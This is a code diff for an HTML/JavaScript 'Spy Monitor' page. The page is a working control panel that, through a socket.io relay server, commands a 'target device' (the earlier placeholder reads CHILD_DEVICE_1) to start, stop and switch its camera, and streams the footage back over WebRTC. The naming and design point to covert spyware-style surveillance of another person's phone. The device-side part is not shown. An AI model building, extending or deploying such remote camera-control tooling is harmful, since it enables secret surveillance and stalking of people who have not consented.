@@ -3,363 +3,153 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Spy Camera Monitor V2 (Fixed)</title>
+    <title>Spy Monitor V2 - Final Stable</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.js"></script>
     <style>
-        /* --- PHONE UI STYLE --- */
-        body {
-            margin: 0; padding: 0;
-            background-color: #121212;
-            color: white;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden;
-        }
-
-        .phone-frame {
-            position: relative;
-            width: 100%; height: 100%;
-            max-width: 480px;
-            max-height: 850px;
-            background: #000;
-            border-radius: 0px;
-            box-shadow: 0 0 30px rgba(0, 150, 255, 0.3);
-            display: flex;
-            flex-direction: column;
-            overflow: hidden;
-        }
-
-        @media (min-width: 500px) {
-            .phone-frame {
-                border-radius: 30px;
-                border: 8px solid #222;
-                height: 90vh;
-            }
-        }
-
+        /* CSS vahi rakhi hai jo aapke working code mein thi */
+        body { margin: 0; padding: 0; background-color: #121212; color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .phone-frame { position: relative; width: 100%; height: 100%; max-width: 480px; background: #000; display: flex; flex-direction: column; overflow: hidden; border: 2px solid #333; }
+        
         /* Video Area */
-        .video-container {
-            flex-grow: 1;
-            position: relative;
-            background: #000; /* Deep Black Background */
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
+        .video-container { flex-grow: 1; position: relative; background: #000; display: flex; align-items: center; justify-content: center; }
+        video { width: 100%; height: 100%; object-fit: contain; background-color: #000; }
 
-        video {
-            width: 100%; height: 100%;
-            object-fit: contain; /* Cover ki jagah Contain kiya taaki video kate nahi */
-            transform: scaleX(-1); /* Mirror view */
-            background-color: #000;
-        }
-
-        /* Loading / Status Text */
-        .status-overlay {
-            position: absolute;
-            top: 50%; left: 50%;
-            transform: translate(-50%, -50%);
-            text-align: center;
-            z-index: 5;
-            pointer-events: none;
-            display: block;
-        }
-        .spinner {
-            border: 4px solid rgba(255,255,255,0.1);
-            border-left-color: #00a8ff;
-            border-radius: 50%;
-            width: 40px; height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 10px;
-        }
+        .status-overlay { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; z-index: 5; }
+        .spinner { border: 4px solid rgba(255,255,255,0.1); border-left-color: #00a8ff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 10px; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
 
         /* Top Bar */
-        .top-bar {
-            position: absolute;
-            top: 0; left: 0; width: 100%;
-            padding: 15px 0;
-            background: linear-gradient(to bottom, rgba(0,0,0,0.8), transparent);
-            z-index: 10;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 10px 20px;
-            box-sizing: border-box;
-        }
+        .top-bar { padding: 10px 20px; background: rgba(0,0,0,0.8); display: flex; justify-content: space-between; align-items: center; z-index: 10; }
+        .status-badge { background: #ff4444; padding: 5px 12px; border-radius: 15px; font-size: 11px; font-weight: bold; }
+        .status-badge.online { background: #00C851; color: white; }
 
-        .status-badge {
-            background: #ff4444;
-            padding: 5px 12px;
-            border-radius: 15px;
-            font-size: 11px;
-            font-weight: bold;
-            text-transform: uppercase;
-        }
-        .status-badge.online { background: #00C851; color: black; }
+        /* Controls */
+        .controls { padding: 20px; background: #1a1a1a; display: flex; justify-content: space-around; align-items: center; gap: 10px; }
+        .btn { border: none; border-radius: 30px; font-weight: bold; cursor: pointer; transition: 0.2s; color: white; padding: 12px 20px; }
+        .btn-start { background: #00C851; flex: 2; }
+        .btn-stop { background: #ff4444; flex: 2; }
+        .btn-switch { background: #33b5e5; flex: 1; border-radius: 50%; width: 50px; height: 50px; padding: 0; }
 
-        .btn-reconnect {
-            background: #00a8ff;
-            border: none;
-            color: white;
-            padding: 8px 15px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: bold;
-            cursor: pointer;
-            box-shadow: 0 4px 10px rgba(0, 168, 255, 0.3);
-        }
-        .btn-reconnect:active { transform: scale(0.95); }
-
-        /* Bottom Controls */
-        .controls {
-            height: 120px;
-            background: rgba(0,0,0,0.8);
-            display: flex;
-            justify-content: space-around;
-            align-items: center;
-            z-index: 10;
-            padding-bottom: 20px;
-        }
-
-        .btn-switch {
-            width: 60px; height: 60px;
-            background: rgba(255,255,255,0.15);
-            border-radius: 50%;
-            border: none;
-            cursor: pointer;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        .btn-switch:active { background: rgba(255,255,255,0.3); }
-        .icon-switch { font-size: 24px; }
-
-        /* Login Overlay */
-        #login-overlay {
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: #000;
-            z-index: 100;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        input {
-            padding: 12px;
-            border-radius: 8px;
-            border: 1px solid #333;
-            background: #222;
-            color: white;
-            text-align: center;
-            margin-bottom: 15px;
-            font-size: 16px;
-            width: 70%;
-        }
-
-        button.start-btn {
-            padding: 12px 30px;
-            background: #00C851;
-            color: white;
-            border: none;
-            border-radius: 30px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            box-shadow: 0 0 15px rgba(0, 200, 81, 0.4);
-        }
-
+        #login-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 100; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        input { padding: 12px; border-radius: 8px; border: 1px solid #333; background: #222; color: white; text-align: center; margin-bottom: 15px; width: 70%; }
     </style>
 </head>
 <body>
 
     <div class="phone-frame">
-        
         <div id="login-overlay">
-            <h2 style="margin-bottom: 10px;">Spy Monitor</h2>
-            <p style="color: #888; font-size: 13px; margin-bottom: 30px;">Enter Target Device ID</p>
-            
-            <input type="text" id="targetId" placeholder="CHILD_DEVICE_1">
-            <button class="start-btn" onclick="saveAndConnect()">CONNECT</button>
+            <h2>Spy Monitor</h2>
+            <input type="text" id="targetId" placeholder="Enter Device ID">
+            <button class="btn btn-start" style="width:70%" onclick="saveAndConnect()">CONNECT</button>
         </div>
 
         <div class="top-bar">
             <span id="status" class="status-badge">Offline</span>
-            <button class="btn-reconnect" onclick="restartConnection()">⚡ RESTART</button>
+            <span id="id-label" style="font-size: 10px; color: #555;">ID: --</span>
         </div>
 
         <div class="video-container">
-            <div id="loader" class="status-overlay">
+            <div id="loader" class="status-overlay" style="display: none;">
                 <div class="spinner"></div>
-                <span style="font-size:12px; color:#aaa;">Waiting for video...</span>
+                <span style="font-size:12px; color:#aaa;">Connecting to Camera...</span>
             </div>
-            <video id="remoteVideo" autoplay playsinline muted controls></video>
+            <video id="remoteVideo" autoplay playsinline muted></video>
         </div>
 
         <div class="controls">
-            <button class="btn-switch" onclick="switchCamera()">
-                <span class="icon-switch">🔄</span>
-            </button>
+            <button class="btn btn-start" onclick="handleStream('start')">▶ START</button>
+            <button class="btn btn-switch" onclick="switchCamera()">🔄</button>
+            <button class="btn btn-stop" onclick="handleStream('stop')">⏹ STOP</button>
         </div>
     </div>
 
     <script>
-        // ✅ SERVER CONFIGURATION
         const SOCKET_URL = "https://child-v9no.onrender.com"; 
+        let socket, peerConnection, targetDeviceId = "";
+        const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
 
-        let socket;
-        let peerConnection;
-        let targetDeviceId = "";
-        
-        const config = {
-            iceServers: [
-                { urls: 'stun:stun.l.google.com:19302' }
-            ]
-        };
-
-        // 1. PAGE LOAD
-        window.onload = function() {
+        window.onload = () => {
             const savedId = localStorage.getItem("savedDeviceId");
-            if (savedId) {
-                document.getElementById("targetId").value = savedId;
-            }
+            if (savedId) document.getElementById("targetId").value = savedId;
         };
 
-        // 2. CONNECT BUTTON
         function saveAndConnect() {
-            const inputId = document.getElementById("targetId").value.trim();
-            if (!inputId) return alert("Enter Device ID!");
-
-            targetDeviceId = inputId;
+            targetDeviceId = document.getElementById("targetId").value.trim();
+            if (!targetDeviceId) return alert("Enter Device ID!");
             localStorage.setItem("savedDeviceId", targetDeviceId);
+            document.getElementById("id-label").innerText = "ID: " + targetDeviceId;
             document.getElementById("login-overlay").style.display = 'none';
-            
             initSocket();
-        }
-
-        // 3. RESTART FUNCTION
-        function restartConnection() {
-            console.log("⚡ Restarting Connection...");
-            updateStatus("Restarting...", false);
-            
-            const video = document.getElementById("remoteVideo");
-            video.srcObject = null; // Clear video
-
-            if (peerConnection) {
-                peerConnection.close();
-                peerConnection = null;
-            }
-            if (socket) {
-                socket.emit('leave', "ADMIN");
-            }
-
-            if (socket && socket.connected) {
-                socket.emit('send-command', {
-                    targetId: targetDeviceId,
-                    command: "start_video"
-                });
-                document.getElementById("loader").style.display = 'block';
-            } else {
-                initSocket();
-            }
         }
 
         function initSocket() {
             if (socket) socket.disconnect();
-            
             socket = io(SOCKET_URL);
 
             socket.on("connect", () => {
-                console.log("✅ Socket Connected");
-                updateStatus("Waiting...", false);
+                updateStatus("System Ready", false);
                 socket.emit("join-room", "ADMIN");
-
-                setTimeout(() => {
-                    socket.emit('send-command', {
-                        targetId: targetDeviceId,
-                        command: "start_video"
-                    });
-                }, 1000);
             });
 
-            socket.on("disconnect", () => {
-                updateStatus("Socket Offline", false);
-            });
-
-            // 📡 OFFER RECEIVED
             socket.on("offer", async (data) => {
-                console.log("📡 Offer Received from Device");
+                console.log("📡 Offer Received");
                 document.getElementById("loader").style.display = 'none';
-                updateStatus("Online", true);
-
                 createPeerConnection();
-
                 try {
-                    await peerConnection.setRemoteDescription(new RTCSessionDescription({
-                        type: "offer",
-                        sdp: data.sdp
-                    }));
-
+                    await peerConnection.setRemoteDescription(new RTCSessionDescription(data));
                     const answer = await peerConnection.createAnswer();
                     await peerConnection.setLocalDescription(answer);
-
-                    socket.emit("answer", {
-                        target: targetDeviceId,
-                        type: "answer",
-                        sdp: answer.sdp
-                    });
-                } catch (e) {
-                    console.error("Offer Error:", e);
-                }
+                    socket.emit("answer", { target: targetDeviceId, type: "answer", sdp: answer.sdp });
+                } catch (e) { console.error(e); }
             });
 
-            // ❄️ ICE CANDIDATE
             socket.on("candidate", async (data) => {
                 if (peerConnection) {
-                    try {
-                        await peerConnection.addIceCandidate(new RTCIceCandidate({
-                            candidate: data.candidate,
-                            sdpMid: data.sdpMid,
-                            sdpMLineIndex: data.sdpMLineIndex
-                        }));
-                    } catch (e) { console.error("Candidate Error", e); }
+                    try { await peerConnection.addIceCandidate(new RTCIceCandidate(data)); } 
+                    catch (e) { console.error(e); }
                 }
             });
+        }
+
+        // --- Start/Stop Logic ---
+        function handleStream(action) {
+            if (!socket || !socket.connected) return alert("Socket not connected!");
+
+            if (action === 'start') {
+                document.getElementById("loader").style.display = 'block';
+                updateStatus("Starting Camera...", false);
+                socket.emit('send-command', { targetId: targetDeviceId, command: "start_video" });
+            } 
+            else if (action === 'stop') {
+                updateStatus("Stopping...", false);
+                socket.emit('send-command', { targetId: targetDeviceId, command: "stop_video" });
+                
+                // Clean UI & WebRTC
+                const video = document.getElementById("remoteVideo");
+                video.srcObject = null;
+                if (peerConnection) {
+                    peerConnection.close();
+                    peerConnection = null;
+                }
+                document.getElementById("loader").style.display = 'none';
+                updateStatus("Stopped", false);
+            }
         }
 
         function createPeerConnection() {
             if (peerConnection) peerConnection.close();
             peerConnection = new RTCPeerConnection(config);
 
-            // ✅ CRITICAL FIX: Robust Track Handling
+            // Aapki working track logic
             peerConnection.ontrack = (event) => {
-                console.log("🎥 Video Track Received:", event.track.kind);
                 const video = document.getElementById("remoteVideo");
-                
-                // Fallback: Agar streams array khali hai to naya stream banao
                 if (event.streams && event.streams[0]) {
                     video.srcObject = event.streams[0];
-                    console.log("✅ Using event.streams[0]");
                 } else {
-                    if (!video.srcObject) {
-                        video.srcObject = new MediaStream([event.track]);
-                        console.log("✅ Created new MediaStream");
-                    } else {
-                        video.srcObject.addTrack(event.track);
-                    }
+                    if (!video.srcObject) video.srcObject = new MediaStream([event.track]);
+                    else video.srcObject.addTrack(event.track);
                 }
-
-                // 🔥 FORCE PLAY
-                video.play().then(() => {
-                    console.log("▶️ Video Playing");
-                }).catch(e => {
-                    console.error("❌ Auto-play failed (Click play manually)", e);
-                });
+                updateStatus("LIVE", true);
             };
 
             peerConnection.onicecandidate = (event) => {
@@ -373,41 +163,17 @@
                     });
                 }
             };
-            
-            peerConnection.onconnectionstatechange = () => {
-                console.log("Connection State:", peerConnection.connectionState);
-                if(peerConnection.connectionState === 'connected') {
-                     updateStatus("Connected", true);
-                }
-                if(peerConnection.connectionState === 'disconnected') {
-                    updateStatus("Disconnected", false);
-                    document.getElementById("loader").style.display = 'block';
-                }
-            };
         }
 
         function switchCamera() {
-            if(socket) {
-                const btn = document.querySelector('.btn-switch');
-                btn.style.transform = "rotate(180deg)";
-                setTimeout(() => btn.style.transform = "rotate(0deg)", 300);
-
-                socket.emit("switch-camera", { target: targetDeviceId });
-            }
+            if(socket) socket.emit("switch-camera", { target: targetDeviceId });
         }
 
         function updateStatus(text, isOnline) {
             const el = document.getElementById("status");
             el.innerText = text;
-            if (isOnline) {
-                el.classList.add("online");
-                el.style.backgroundColor = "#00C851"; 
-            } else {
-                el.classList.remove("online");
-                el.style.backgroundColor = "#ff4444";
-            }
+            el.className = isOnline ? "status-badge online" : "status-badge";
         }
-
     </script>
 </body>
 </html>
